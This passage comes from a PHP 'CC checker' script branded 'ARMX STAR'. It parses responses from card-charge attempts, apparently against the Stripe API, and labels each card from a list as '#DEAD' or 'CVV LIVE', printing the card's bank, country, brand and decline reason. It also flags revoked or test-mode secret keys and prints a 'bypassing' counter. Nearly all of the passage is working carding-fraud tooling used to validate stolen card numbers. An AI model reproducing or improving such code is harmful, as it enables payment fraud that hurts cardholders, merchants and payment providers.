    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC-DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CARD-NOT-SUPPORTED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-UNCHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT-SUPPORTED-CURRENCY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT SUPPORTED PURCHASE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">'.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK TESTMODE_CHARGE ONLY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">  '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK KEY REVOKED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">     '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">Card Not Supported</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
else {
    echo '   <font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">Gate Closed</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
   

      
}





//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";

$end = microtime(true);
$time_taken = $end - $start;

echo "ᵗⁱᵐᵉ: " . round($time_taken, .5) . " s.";

echo " ᵇʸᵖᵃˢˢⁱⁿᵍ: $x <br>";

//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>
